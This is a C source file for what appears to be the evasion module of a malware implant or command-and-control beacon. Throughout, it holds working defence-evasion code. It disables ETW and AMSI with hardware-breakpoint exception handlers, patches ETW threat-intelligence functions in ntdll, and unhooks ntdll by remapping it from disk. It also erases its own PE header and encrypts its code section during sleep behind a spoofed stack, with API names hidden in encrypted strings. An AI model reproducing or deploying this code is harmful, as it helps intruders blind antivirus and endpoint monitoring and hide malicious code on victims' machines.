#include "evasion.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include <windows.h>
#include <bcrypt.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

/* NtProtectVirtualMemory direct call */
typedef NTSTATUS (NTAPI *NtPVM_t)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

static BOOL _nt_prot(LPVOID addr, SIZE_T sz, DWORD prot, DWORD *old)
{
    static NtPVM_t _fn = NULL;
    if (!_fn) {
        char ns[12], fs[24];
        EVS_D(ns, EVS_dll_ntdll);
        HMODULE h = _peb_module(ns);
        SecureZeroMemory(ns, sizeof(ns));
        if (h) {
            EVS_D(fs, EVS_fn_NtProtectVirtualMemory);
            _fn = (NtPVM_t)(void *)GetProcAddress(h, fs);
            SecureZeroMemory(fs, sizeof(fs));
        }
    }
    if (!_fn) return FALSE;
    PVOID  base = addr;
    SIZE_T rsz  = sz;
    ULONG  _old = 0;
    NTSTATUS st = _fn((HANDLE)(LONG_PTR)-1, &base, &rsz, (ULONG)prot, &_old);
    if (old) *old = (DWORD)_old;
    return st == 0;
}

/* Dynamic kernel32 API resolvers */
typedef BOOL   (WINAPI *GTC_t)(HANDLE, PCONTEXT);
typedef BOOL   (WINAPI *STC_t)(HANDLE, const CONTEXT *);
typedef LPVOID (WINAPI *MVF_t)(HANDLE, DWORD, DWORD, DWORD, DWORD);
typedef BOOL   (WINAPI *UMVF_t)(LPCVOID);

static HMODULE _k32(void)
{
    static HMODULE h = NULL;
    if (h) return h;
    char s[16]; EVS_D(s, EVS_dll_kernel32);
    h = _peb_module(s);
    SecureZeroMemory(s, sizeof(s));
    return h;
}

#define _K32_LAZY(type, var, enc_arr) \
    static type var = NULL; \
    if (!var) { char _fs[20]; EVS_D(_fs, enc_arr); \
        var = (type)(void *)GetProcAddress(_k32(), _fs); \
        SecureZeroMemory(_fs, sizeof(_fs)); }

static BOOL _gtc(HANDLE t, PCONTEXT c)
{
    _K32_LAZY(GTC_t, fn, EVS_fn_GetThreadContext)
    return fn ? fn(t, c) : FALSE;
}

static BOOL _stc(HANDLE t, const CONTEXT *c)
{
    _K32_LAZY(STC_t, fn, EVS_fn_SetThreadContext)
    return fn ? fn(t, c) : FALSE;
}

static LPVOID _mvf(HANDLE hm, DWORD acc, DWORD hi, DWORD lo, DWORD sz)
{
    _K32_LAZY(MVF_t, fn, EVS_fn_MapViewOfFile)
    return fn ? fn(hm, acc, hi, lo, sz) : NULL;
}

static BOOL _umvf(LPCVOID p)
{
    _K32_LAZY(UMVF_t, fn, EVS_fn_UnmapViewOfFile)
    return fn ? fn(p) : FALSE;
}

static LPVOID  g_etw_fn       = NULL;
static LPVOID  g_amsi_fn      = NULL;  /* AmsiScanBuffer  — Dr1 */
static LPVOID  g_amsi_scan_fn = NULL;  /* AmsiScanString  — Dr2 */
static HANDLE  g_veh       = NULL;
static BOOL    g_init_done = FALSE;

typedef PVOID (WINAPI *_AVEH_t)(ULONG, PVECTORED_EXCEPTION_HANDLER);
static PVOID _aveh(ULONG first, PVECTORED_EXCEPTION_HANDLER fn)
{
    static _AVEH_t _fn = NULL;
    if (!_fn) {
        char s[32] = {0};
        char sk[16] = {0};
        EVS_D(s, EVS_fn_AddVectoredExceptionHandler);
        EVS_D(sk, EVS_dll_kernel32);
        HMODULE h = _peb_module(sk);
        if (h) _fn = (_AVEH_t)(void *)GetProcAddress(h, s);
        SecureZeroMemory(s, sizeof(s));
        SecureZeroMemory(sk, sizeof(sk));
    }
    return _fn ? _fn(first, fn) : NULL;
}

/* Resolve ETW/AMSI targets */

static void _resolve_targets(void)
{
    char s[24];

    /* ETW */
    EVS_D(s, EVS_dll_ntdll);
    HMODULE ntdll = _peb_module(s);
    SecureZeroMemory(s, sizeof(s));
    if (ntdll) {
        EVS_D(s, EVS_fn_EtwEventWrite);
        g_etw_fn = (LPVOID)GetProcAddress(ntdll, s);
        SecureZeroMemory(s, sizeof(s));
    }

    /* AMSI — may not be present on all systems */
    EVS_D(s, EVS_dll_amsi);
    HMODULE hamsi = _peb_module(s); /* only if already mapped */
    SecureZeroMemory(s, sizeof(s));
    if (hamsi) {
        EVS_D(s, EVS_fn_AmsiScanBuffer);
        g_amsi_fn = (LPVOID)GetProcAddress(hamsi, s);
        SecureZeroMemory(s, sizeof(s));
        EVS_D(s, EVS_fn_AmsiScanString);
        g_amsi_scan_fn = (LPVOID)GetProcAddress(hamsi, s);
        SecureZeroMemory(s, sizeof(s));
    }
}

/* VEH handler for ETW/AMSI */
__attribute__((section(".run"), noinline))
static LONG WINAPI _hwbp_veh(EXCEPTION_POINTERS *ep)
{
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    CONTEXT *ctx = ep->ContextRecord;
    BOOL handled = FALSE;

    if (g_etw_fn && (LPVOID)(uintptr_t)ctx->Rip == g_etw_fn) {
        ctx->Rax  = 0;                           /* STATUS_SUCCESS */
        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
        ctx->Rsp += 8;
        ctx->Dr6 &= ~(DWORD64)0x1;               /* clear B0 */
        handled   = TRUE;
    }

    if (g_amsi_fn && (LPVOID)(uintptr_t)ctx->Rip == g_amsi_fn) {
        ctx->Rax  = 0x80070057;                  /* E_INVALIDARG */
        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
        ctx->Rsp += 8;
        ctx->Dr6 &= ~(DWORD64)0x2;               /* clear B1 */
        handled   = TRUE;
    }

    if (g_amsi_scan_fn && (LPVOID)(uintptr_t)ctx->Rip == g_amsi_scan_fn) {
        ctx->Rax  = 0x80070057;                  /* E_INVALIDARG */
        ctx->Rip  = *(DWORD64 *)(uintptr_t)ctx->Rsp;
        ctx->Rsp += 8;
        ctx->Dr6 &= ~(DWORD64)0x4;               /* clear B2 */
        handled   = TRUE;
    }

    return handled ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH;
}

/* Set debug registers on a thread */
BOOL evasion_apply_thread(HANDLE hThread)
{
    if (!g_etw_fn && !g_amsi_fn && !g_amsi_scan_fn) return FALSE;

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!_gtc(hThread, &ctx)) return FALSE;

    if (g_etw_fn)       ctx.Dr0 = (DWORD64)(uintptr_t)g_etw_fn;
    if (g_amsi_fn)      ctx.Dr1 = (DWORD64)(uintptr_t)g_amsi_fn;
    if (g_amsi_scan_fn) ctx.Dr2 = (DWORD64)(uintptr_t)g_amsi_scan_fn;

    ctx.Dr7  &= ~(DWORD64)0x0FFF0015;
    ctx.Dr7  |= g_etw_fn       ? 0x01 : 0;
    ctx.Dr7  |= g_amsi_fn      ? 0x04 : 0;
    ctx.Dr7  |= g_amsi_scan_fn ? 0x10 : 0;

    return _stc(hThread, &ctx) != 0;
}

/* One-time init */

static void _evasion_init(void)
{
    if (g_init_done) return;
    g_init_done = TRUE;

    _resolve_targets();

    if (!g_etw_fn && !g_amsi_fn) return;

    /* register VEH, first in chain */
    if (!g_veh)
        g_veh = _aveh(1, _hwbp_veh);

    /* arm breakpoints on calling thread */
    evasion_apply_thread(GetCurrentThread());
}

/* public API */

void evasion_patch_etw(void)  { _evasion_init(); }
void evasion_patch_amsi(void) { _evasion_init(); }

/* Patch ETW TI functions in ntdll */
void evasion_patch_etw_ti(void)
{
    char s[32];
    EVS_D(s, EVS_dll_ntdll);
    HMODULE ntdll = _peb_module(s);
    SecureZeroMemory(s, sizeof(s));
    if (!ntdll) return;

    const struct { const unsigned char *enc; size_t n; } fns[] = {
        { EVS_fn_EtwTiLogOpenProcess,     sizeof(EVS_fn_EtwTiLogOpenProcess)     },
        { EVS_fn_EtwTiLogReadWriteVm,     sizeof(EVS_fn_EtwTiLogReadWriteVm)     },
        { EVS_fn_EtwTiLogDuplicateHandle, sizeof(EVS_fn_EtwTiLogDuplicateHandle) },
    };

    for (int i = 0; i < 3; i++) {
        _evs_dec(s, fns[i].enc, fns[i].n);
        BYTE *fn = (BYTE *)(void *)GetProcAddress(ntdll, s);
        SecureZeroMemory(s, sizeof(s));
        if (!fn) continue;

        DWORD old;
        if (!_nt_prot(fn, 1, PAGE_EXECUTE_READWRITE, &old)) continue;
        *fn = 0xC3;
        _nt_prot(fn, 1, old, &old);
    }
}

/* Restore ntdll from disk */

void evasion_unhook_ntdll(void)
{
    /* Build ntdll.dll path: GetSystemDirectoryW + "\ntdll.dll" */
    WCHAR path[MAX_PATH];
    UINT  dir_len = GetSystemDirectoryW(path, MAX_PATH);
    if (!dir_len || dir_len > MAX_PATH - 12) return;

    /* append \ntdll.dll as wide chars */
    const WCHAR suffix[] = { L'\\',L'n',L't',L'd',L'l',L'l',L'.',L'd',L'l',L'l',L'\0' };
    wcsncpy(path + dir_len, suffix, 11);

    /* map ntdll from disk via SEC_IMAGE to bypass file hooks */
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingW(hFile, NULL,
                                     PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return;

    LPVOID disk = _mvf(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!disk) return;

    /* get live ntdll base */
    char sname[12];
    EVS_D(sname, EVS_dll_ntdll);
    HMODULE live = _peb_module(sname);
    SecureZeroMemory(sname, sizeof(sname));
    if (!live) goto cleanup;

    /* parse PE headers to find .text section */
    IMAGE_DOS_HEADER  *dos = (IMAGE_DOS_HEADER  *)disk;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) goto cleanup;
    IMAGE_NT_HEADERS  *nt  = (IMAGE_NT_HEADERS  *)((BYTE *)disk + dos->e_lfanew);
    if (nt->Signature  != IMAGE_NT_SIGNATURE)  goto cleanup;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;

        LPVOID  live_text = (BYTE *)live + sec->VirtualAddress;
        LPVOID  disk_text = (BYTE *)disk + sec->VirtualAddress;
        SIZE_T  text_sz   = sec->Misc.VirtualSize;

        DWORD old;
        if (!_nt_prot(live_text, text_sz, PAGE_EXECUTE_READWRITE, &old))
            break;
        memcpy(live_text, disk_text, text_sz);
        _nt_prot(live_text, text_sz, old, &old);
        break;
    }

cleanup:
    _umvf(disk);
}

/* Remove the PE header at module base */
void evasion_stomp_header(void)
{
    HMODULE base = (HMODULE)_peb_self_base();
    if (!base) return;
    DWORD old;
    if (!_nt_prot(base, 0x1000, PAGE_READWRITE, &old)) return;
    SecureZeroMemory(base, 0x1000);
    _nt_prot(base, 0x1000, old, &old);
}

/* Sleep obfuscation */

/* Typedefs for dynamically resolved APIs */

typedef NTSTATUS (NTAPI *NtContinue_t)(PCONTEXT, BOOLEAN);
typedef NTSTATUS (NTAPI *NtWait_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef VOID     (NTAPI *RtlCapCtx_t)(PCONTEXT);
typedef BOOL   (WINAPI *VProt_t)    (LPVOID, SIZE_T, DWORD, PDWORD);
typedef void   (WINAPI *Sleep_t)    (DWORD);
typedef BOOL   (WINAPI *SetEvent_t) (HANDLE);

#define FAKE_STACK_SZ 0x10000  /* 64KB virtual stack for fake context */

typedef struct {
    LPVOID        text_base;
    SIZE_T        text_size;
    BYTE          key[32];
    DWORD         sleep_ms;
    HANDLE        done;
    NtContinue_t  ntcontinue;
    LARGE_INTEGER timeout;        /* negative relative timeout */
    LPVOID        fake_stack_mem; /* VirtualAlloc'd fake stack */
    PVOID         orig_stack_base;  /* TEB StackBase to restore */
    PVOID         orig_stack_limit; /* TEB StackLimit to restore */
    VProt_t       fn_vprot;       /* direct kernel32 VA, not IAT thunk */
    Sleep_t       fn_sleep;       /* direct kernel32 VA, not IAT thunk */
    SetEvent_t    fn_setevent;    /* direct kernel32 VA, not IAT thunk */
} obf_ctx_t;

/* Read/write TEB fields via GS */
__attribute__((section(".run")))
static inline PVOID _teb_read_ptr(DWORD64 off) {
    PVOID v;
    __asm__ __volatile__("movq %%gs:(%1), %0" : "=r"(v) : "r"(off));
    return v;
}
__attribute__((section(".run")))
static inline void _teb_write_ptr(DWORD64 off, PVOID val) {
    __asm__ __volatile__("movq %0, %%gs:(%1)" :: "r"(val), "r"(off) : "memory");
}

/* Globals used from .noscan */
static CONTEXT        s_saved_ctx = {0};
static obf_ctx_t     *s_obf_ctx   = NULL;
static volatile LONG  s_restore   = 0;

/* .noscan data */

__attribute__((section(".run"), noinline))
static DWORD WINAPI _timer_thread(LPVOID arg)
{
    obf_ctx_t *c = (obf_ctx_t *)arg;
    /* use direct pointers, IAT thunks in .text are NOACCESS during sleep */
    c->fn_sleep(c->sleep_ms);
    c->fn_setevent(c->done);
    return 0;
}

/* Wake up and restore state */
__attribute__((section(".run"), noinline))
static void _sleep_trampoline(void)
{
    obf_ctx_t *c = s_obf_ctx;
    BYTE      *p = (BYTE *)c->text_base;
    SIZE_T     n =          c->text_size;
    DWORD      old;

    /* use fn_vprot directly, not IAT thunk (which is in PAGE_NOACCESS .text) */
    c->fn_vprot(p, n, PAGE_READWRITE, &old);
    for (SIZE_T i = 0; i < n; i++) p[i] ^= c->key[i & 31];
    /* try XR first; fall back to XRW for ACG-enforced systems */
    if (!c->fn_vprot(p, n, PAGE_EXECUTE_READ, &old))
        c->fn_vprot(p, n, PAGE_EXECUTE_READWRITE, &old);

    /* restore TEB stack bounds */
    _teb_write_ptr(0x08, c->orig_stack_base);
    _teb_write_ptr(0x10, c->orig_stack_limit);

    c->ntcontinue(&s_saved_ctx, FALSE);
    __builtin_unreachable();
}

/* Encrypt text and switch to fake context */
__attribute__((section(".run"), noinline))
static void _obf_sleep_tail(obf_ctx_t *ctx, CONTEXT *fake_ctx_ptr)
{
    BYTE  *p = (BYTE *)ctx->text_base;
    SIZE_T n = ctx->text_size;
    DWORD  old;

    for (SIZE_T i = 0; i < n; i++) p[i] ^= ctx->key[i & 31];
    ctx->fn_vprot(p, n, PAGE_NOACCESS, &old);

    /* update TEB stack bounds for fake stack */
    _teb_write_ptr(0x08, (PVOID)((BYTE *)ctx->fake_stack_mem + FAKE_STACK_SZ));
    _teb_write_ptr(0x10, ctx->fake_stack_mem);

    ctx->ntcontinue(fake_ctx_ptr, FALSE);
    __builtin_unreachable();
}

static void _find_section(const char *name, LPVOID *base, SIZE_T *sz)
{
    *base = NULL; *sz = 0;
    BYTE *img = (BYTE *)_peb_self_base();
    if (!img) return;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        int ok = 1;
        for (int j = 0; j < 8; j++) {
            char c = name[j];
            if (sec->Name[j] != (unsigned char)c) { ok = 0; break; }
            if (!c) break;
        }
        if (ok) { *base = img + sec->VirtualAddress; *sz = sec->Misc.VirtualSize; return; }
    }
}

#define _XDEC(enc, dst) EVS_D((dst), (enc))

void beacon_sleep_obf(DWORD ms)
{
#if JITTER_PCT == 0
    /* Test mode: skip .text encrypt dance, just sleep */
    Sleep(ms);
    return;
#endif
    LPVOID text_base = NULL;
    SIZE_T text_size = 0;
    _find_section(".text", &text_base, &text_size);
    if (!text_base || !text_size) { Sleep(ms); return; }

    char s[24] = {0};

    _XDEC(EVS_dll_ntdll, s);
    HMODULE hntdll = _peb_module(s);
    SecureZeroMemory(s, sizeof(s));
    if (!hntdll) { Sleep(ms); return; }

    _XDEC(EVS_fn_NtContinue, s);
    NtContinue_t fn_cont = (NtContinue_t)(void *)GetProcAddress(hntdll, s);
    SecureZeroMemory(s, sizeof(s));

    _XDEC(EVS_fn_NtWaitForSingleObject, s);
    NtWait_t fn_wait = (NtWait_t)(void *)GetProcAddress(hntdll, s);
    SecureZeroMemory(s, sizeof(s));

    _XDEC(EVS_fn_RtlCaptureContext, s);
    RtlCapCtx_t fn_cap = (RtlCapCtx_t)(void *)GetProcAddress(hntdll, s);
    SecureZeroMemory(s, sizeof(s));

    _XDEC(EVS_fn_RtlUserThreadStart, s);
    PVOID fn_rts = (PVOID)GetProcAddress(hntdll, s);
    SecureZeroMemory(s, sizeof(s));

    if (!fn_cont || !fn_wait || !fn_cap) { Sleep(ms); return; }

    /* resolve kernel32 functions by direct VA, not IAT thunks */
    _XDEC(EVS_dll_kernel32, s);
    HMODULE hk32 = _peb_module(s);
    SecureZeroMemory(s, sizeof(s));
    if (!hk32) { Sleep(ms); return; }

    _XDEC(EVS_fn_VirtualProtect, s);
    VProt_t    fn_vprot    = (VProt_t)   GetProcAddress(hk32, s);
    SecureZeroMemory(s, sizeof(s));

    _XDEC(EVS_fn_Sleep, s);
    Sleep_t    fn_sleep    = (Sleep_t)   GetProcAddress(hk32, s);
    SecureZeroMemory(s, sizeof(s));

    _XDEC(EVS_fn_SetEvent, s);
    SetEvent_t fn_setevent = (SetEvent_t)GetProcAddress(hk32, s);
    SecureZeroMemory(s, sizeof(s));

    if (!fn_vprot || !fn_sleep || !fn_setevent) { Sleep(ms); return; }

    obf_ctx_t *ctx = (obf_ctx_t *)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(obf_ctx_t));
    if (!ctx) { Sleep(ms); return; }

    ctx->text_base   = text_base;
    ctx->text_size   = text_size;
    ctx->sleep_ms    = ms;
    ctx->ntcontinue  = fn_cont;
    ctx->fn_vprot    = fn_vprot;
    ctx->fn_sleep    = fn_sleep;
    ctx->fn_setevent = fn_setevent;
    ctx->done        = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!ctx->done) { HeapFree(GetProcessHeap(), 0, ctx); Sleep(ms); return; }

    /* relative timeout in 100ns units, with 5s buffer */
    ctx->timeout.QuadPart = -((LONGLONG)(ms + 5000) * 10000LL);

    BCryptGenRandom(NULL, ctx->key, sizeof(ctx->key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    /* allocate fake stack so RSP stays within TEB [StackLimit, StackBase] */
    ctx->fake_stack_mem = VirtualAlloc(NULL, FAKE_STACK_SZ,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!ctx->fake_stack_mem) {
        CloseHandle(ctx->done);
        HeapFree(GetProcessHeap(), 0, ctx);
        InterlockedExchange(&s_restore, 0);
        Sleep(ms);
        return;
    }
    /* set trampoline as return address for NtWait */
    PVOID *fake_top = (PVOID *)((BYTE *)ctx->fake_stack_mem + FAKE_STACK_SZ - 16);
    fake_top[0] = (PVOID)_sleep_trampoline;                       /* ret addr for NtWait */
    fake_top[1] = fn_rts ? (PVOID)((BYTE *)fn_rts + 0x10) : NULL; /* fake upper frame */

    /* save TEB stack limits for restoration on wakeup */
    ctx->orig_stack_base  = _teb_read_ptr(0x08);
    ctx->orig_stack_limit = _teb_read_ptr(0x10);

    s_obf_ctx = ctx;
    InterlockedExchange(&s_restore, 0);

    /* save current context (RIP = instruction after this call) */
    fn_cap(&s_saved_ctx);

    /* two-pass: first call sleeps, second call (restored by trampoline) cleans up */
    if (InterlockedCompareExchange(&s_restore, 0, 1) == 1) {
        SecureZeroMemory(ctx->key, sizeof(ctx->key));
        CloseHandle(ctx->done);
        VirtualFree(ctx->fake_stack_mem, 0, MEM_RELEASE);
        HeapFree(GetProcessHeap(), 0, ctx);
        return;
    }
    InterlockedExchange(&s_restore, 1);

    /* build fake context: RSP=fake_stack, RIP=NtWait */
    CONTEXT fake_ctx;
    memcpy(&fake_ctx, &s_saved_ctx, sizeof(CONTEXT));
    fake_ctx.Rsp = (DWORD64)(uintptr_t)fake_top;
    fake_ctx.Rip = (DWORD64)(uintptr_t)fn_wait;
    fake_ctx.Rcx = (DWORD64)ctx->done;                    /* arg1: handle */
    fake_ctx.Rdx = FALSE;                                  /* arg2: alertable */
    fake_ctx.R8  = (DWORD64)(uintptr_t)&ctx->timeout;     /* arg3: timeout */

    /* create timer thread before encrypting .text (DLL_THREAD_ATTACH needs .text) */
    HANDLE ht = CreateThread(NULL, 0, _timer_thread, ctx, 0, NULL);
    if (!ht) {
        SecureZeroMemory(ctx->key, sizeof(ctx->key));
        CloseHandle(ctx->done);
        VirtualFree(ctx->fake_stack_mem, 0, MEM_RELEASE);
        HeapFree(GetProcessHeap(), 0, ctx);
        InterlockedExchange(&s_restore, 0);
        Sleep(ms);
        return;
    }
    /* arm ETW/AMSI breakpoints on timer thread before it runs */
    evasion_apply_thread(ht);
    CloseHandle(ht);

    /* verify page permission round-trip before committing to obfuscated sleep */
    BYTE  *p = (BYTE *)text_base;
    DWORD  old, dummy;

    /* verify RW/XR round-trip; fall back to plain sleep if ACG blocks it */
    if (!_nt_prot(p, text_size, PAGE_READWRITE, &old)) {
        goto _fallback;
    }
    if (!_nt_prot(p, text_size, old, &dummy)) {
        _nt_prot(p, text_size, old, &dummy);
        goto _fallback;
    }
    /* re-apply RW for _obf_sleep_tail */
    _nt_prot(p, text_size, PAGE_READWRITE, &old);

    /* jump to .noscan tail, never returns */
    _obf_sleep_tail(ctx, &fake_ctx);
    __builtin_unreachable();

_fallback:
    SecureZeroMemory(ctx->key, sizeof(ctx->key));
    CloseHandle(ctx->done);
    VirtualFree(ctx->fake_stack_mem, 0, MEM_RELEASE);
    HeapFree(GetProcessHeap(), 0, ctx);
    InterlockedExchange(&s_restore, 0);
    Sleep(ms);
}
